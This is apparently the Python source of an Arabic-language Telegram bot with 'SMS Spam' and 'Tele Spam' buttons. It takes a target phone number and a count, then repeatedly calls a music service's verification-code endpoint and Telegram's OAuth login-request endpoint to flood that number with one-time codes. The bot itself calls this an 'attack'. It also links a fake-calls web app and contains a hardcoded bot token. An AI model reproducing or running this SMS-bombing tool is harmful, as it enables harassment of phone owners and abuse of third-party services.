import telebot
from telebot import types
import requests
import time
import threading
import random
import string
import json
import os
import sys
from datetime import datetime

# ==========================================
# 0. إعدادات التشغيل التلقائي (مهم جداً)
# ==========================================
# هذا الكود يضمن أن البوت يعمل من مجلده الأصلي حتى عند تشغيله تلقائياً
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except:
    pass

# ==========================================
# 1. إعدادات النظام
# ==========================================
API_TOKEN = '8408417562:AAGbJ1VuFQ7nzTQhrTl72Atv5tkBmyFJWlU'
ADMIN_ID = 1431886140

bot = telebot.TeleBot(API_TOKEN)
active_processes = {}

# ==========================================
# 2. إدارة البيانات (Database)
# ==========================================
DB_FILE = "users_db.json"

def load_db():
    if not os.path.exists(DB_FILE): return {}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {}

def save_db(data):
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=4)
    except: pass

def check_user(user):
    db = load_db()
    uid = str(user.id)
    if uid not in db:
        db[uid] = {"name": user.first_name, "banned": False}
        save_db(db)
        try:
            if int(uid) != ADMIN_ID:
                bot.send_message(ADMIN_ID, f"🔔 <b>عضو جديد:</b> {user.first_name} (`{uid}`)", parse_mode="HTML")
        except: pass
    return db[uid].get("banned", False)

def toggle_ban(uid, status):
    db = load_db()
    if str(uid) in db:
        db[str(uid)]["banned"] = status
        save_db(db)
        return True
    return False

# ==========================================
# 3. واجهة البوت والتشغيل
# ==========================================
BANNER = """
★ ABO-ELFADL SECURITY SYSTEM ★
"""

@bot.message_handler(commands=['start'])
def start_msg(message):
    user_id = message.from_user.id
    if check_user(message.from_user):
        bot.reply_to(message, "⛔ <b>أنت محظور.</b>", parse_mode="HTML")
        return

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    btn_web = types.KeyboardButton(text="موقع المطور", web_app=types.WebAppInfo(url="https://mahmoud-ab0-elfadl.netlify.app/"))
    btn_fake = types.KeyboardButton(text="FAKE CALLS", web_app=types.WebAppInfo(url="https://callmyphone.org/app"))
    
    btn_sms = types.KeyboardButton("🔥 SMS Spam")
    btn_tele = types.KeyboardButton("✈️ Tele Spam")
    btn_info = types.KeyboardButton("ℹ️ المطور")
    
    markup.add(btn_sms, btn_tele, btn_fake, btn_web, btn_info)

    if user_id == ADMIN_ID:
        btn_admin = types.KeyboardButton("⚙️ Admin")
        markup.add(btn_admin)

    bot.reply_to(message, f"{BANNER}\n👋 أهلاً بك يا <b>{message.from_user.first_name}</b>.", parse_mode="HTML", reply_markup=markup)

# ==========================================
# 4. المعالجة (Handlers)
# ==========================================

# --- SMS ---
@bot.message_handler(func=lambda message: message.text == "🔥 SMS Spam")
def handle_sms(message):
    if check_user(message.from_user): return
    msg = bot.reply_to(message, "📲 <b>أدخل الرقم المصري (بدون +2):</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, get_sms_phone)

def get_sms_phone(message):
    phone = message.text
    if not phone.isdigit(): return bot.reply_to(message, "❌ رقم خطأ.")
    if phone.startswith("01"): phone = "2" + phone
    
    msg = bot.reply_to(message, "🔢 <b>العدد:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, lambda m: start_spam_sms(m, phone))

def start_spam_sms(message, phone):
    if not message.text.isdigit(): return
    count = int(message.text)
    chat_id = message.chat.id
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 إيقاف", callback_data='stop_sms_attack'))
    
    status_msg = bot.send_message(chat_id, f"🔥 <b>بدأ الهجوم على {phone}...</b>", reply_markup=markup, parse_mode="HTML")
    active_processes[chat_id] = {'running': True, 'type': 'sms'}

    def run():
        url = "https://api.twistmena.com/music/Dlogin/sendCode"
        success = 0
        for i in range(count):
            if not active_processes.get(chat_id, {}).get('running', False):
                bot.send_message(chat_id, "🛑 تم الإيقاف.")
                break
            
            rv = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
            try: 
                r = requests.post(url, json={"dial": phone, "randomValue": rv}, headers={"User-Agent": "Mozilla/5.0"}, timeout=3)
                if r.status_code == 200: success += 1
            except: pass
            
            if i % 5 == 0: # تحديث كل 5 رسائل لتجنب الحظر من تليجرام
                try:
                    bot.edit_message_text(f"🔥 نشط: {success}/{count}", chat_id, status_msg.message_id, reply_markup=markup)
                except: pass
            time.sleep(1.5)
            
        if active_processes.get(chat_id, {}).get('running', False):
            bot.send_message(chat_id, f"✅ تم الانتهاء: {success}")
            try: bot.edit_message_reply_markup(chat_id, status_msg.message_id, reply_markup=None)
            except: pass
    
    threading.Thread(target=run).start()

# --- Telegram ---
@bot.message_handler(func=lambda message: message.text == "✈️ Tele Spam")
def handle_tele(message):
    if check_user(message.from_user): return
    msg = bot.reply_to(message, "✈️ <b>رقم دولي:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, get_tele_phone)

def get_tele_phone(message):
    phone = message.text
    if not phone.isdigit(): return
    msg = bot.reply_to(message, "🔢 <b>العدد:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, lambda m: start_spam_tele(m, phone))

def start_spam_tele(message, phone):
    if not message.text.isdigit(): return
    count = int(message.text)
    chat_id = message.chat.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 إيقاف", callback_data='stop_tele_attack'))
    status_msg = bot.send_message(chat_id, f"✈️ <b>بدأ إزعاج تليجرام...</b>", reply_markup=markup, parse_mode="HTML")
    active_processes[chat_id] = {'running': True, 'type': 'tele'}

    def run():
        success = 0
        for i in range(count):
            if not active_processes.get(chat_id, {}).get('running', False):
                bot.send_message(chat_id, "🛑 تم الإيقاف.")
                break
            try: 
                r = requests.post('https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en', data={'phone': phone}, timeout=5)
                if r.text == "true": success += 1
            except: pass
            time.sleep(1.0)

        if active_processes.get(chat_id, {}).get('running', False):
            bot.send_message(chat_id, f"✅ تم الانتهاء: {success}")
            try: bot.edit_message_reply_markup(chat_id, status_msg.message_id, reply_markup=None)
            except: pass

    threading.Thread(target=run).start()

# --- Info & Admin ---
@bot.message_handler(func=lambda message: message.text == "ℹ️ المطور")
def handle_info(message):
    bot.reply_to(message, "👨‍💻 <b>محمود أبو الفضل</b>", parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "⚙️ Admin")
def handle_admin(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🚫 حظر", callback_data='ban_user'), types.InlineKeyboardButton("✅ فك", callback_data='unban_user'), types.InlineKeyboardButton("📜 قائمة", callback_data='list_users'))
    bot.reply_to(message, "⚙️ Admin Panel:", reply_markup=markup)

# --- Callbacks ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    if call.data in ['stop_sms_attack', 'stop_tele_attack']:
        if chat_id in active_processes:
            active_processes[chat_id]['running'] = False
            bot.answer_callback_query(call.id, "تم الإيقاف")
            bot.edit_message_reply_markup(chat_id, call.message.message_id, reply_markup=None)
        return

    if call.from_user.id != ADMIN_ID: return
    if call.data == 'ban_user':
        msg = bot.send_message(chat_id, "🚫 ID الحظر:")
        bot.register_next_step_handler(msg, lambda m: do_ban(m, True))
    elif call.data == 'unban_user':
        msg = bot.send_message(chat_id, "✅ ID الفك:")
        bot.register_next_step_handler(msg, lambda m: do_ban(m, False))
    elif call.data == 'list_users':
        db = load_db()
        txt = "\n".join([f"{k}: {'🚫' if v['banned'] else '🟢'} {v['name']}" for k,v in db.items()])
        if len(txt) > 4000:
             with open("users.txt", "w", encoding="utf-8") as f: f.write(txt)
             with open("users.txt", "rb") as f: bot.send_document(chat_id, f)
        else: bot.send_message(chat_id, txt or "فارغة")

def do_ban(message, status):
    if toggle_ban(message.text.strip(), status): bot.reply_to(message, "✅ تم")
    else: bot.reply_to(message, "❌ خطأ")

# ==========================================
# 5. التشغيل المستمر (محمي ضد قطع النت)
# ==========================================
if __name__ == "__main__":
    print("--- SYSTEM STARTUP ---")
    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            time.sleep(5) # انتظار 5 ثواني عند انقطاع النت قبل إعادة المحاولة